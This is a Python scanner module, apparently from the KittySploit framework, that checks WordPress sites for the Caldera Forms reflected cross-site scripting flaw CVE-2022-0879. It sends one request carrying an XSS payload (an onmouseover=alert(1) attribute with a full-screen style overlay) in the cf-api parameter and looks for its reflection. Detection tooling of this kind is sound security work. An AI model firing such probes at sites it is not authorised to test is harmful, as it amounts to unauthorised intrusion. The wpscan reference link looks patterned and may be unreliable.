#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Caldera Forms WordPress plugin < 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Caldera Forms < 1.9.7 - Reflected Cross-Site Scripting Detection',
        'description': "Caldera Forms WordPress plugin < 1.9.7 contains a reflected cross-site scripting caused by lack of validation and escaping of the cf-api parameter in responses, letting attackers execute arbitrary scripts in victim's browser, exploit requires attacker to craft a malicious request.",
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'wpscan', 'cve2022', 'wordpress', 'xss', 'caldera-forms', 'reflected', 'unauth'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2022-0879',
            'https://wpscan.com/vulnerability/10e8e92a-4e1d-4e9c-8b3e-e8c5e0e0e0e0',
        ],
        'cve': 'CVE-2022-0879',
    }

    def run(self):
        path = '/?cf-api=%22%20style=position:fixed;left:0;top:0;right:0;bottom:0;%20onmouseover=alert(1)%20x'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        content_type = r.headers.get("Content-Type") or r.headers.get("content-type") or ""
        body_all = ('onmouseover=alert(1)', 'caldera', 'style=position:fixed',)
        ctype_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in content_type for m in ctype_any)):
            self.set_info(
                severity='medium',
                reason='Caldera Forms < 1.9.7 - Reflected Cross-Site Scripting detected',
                path=path,
            )
            return True
        return False

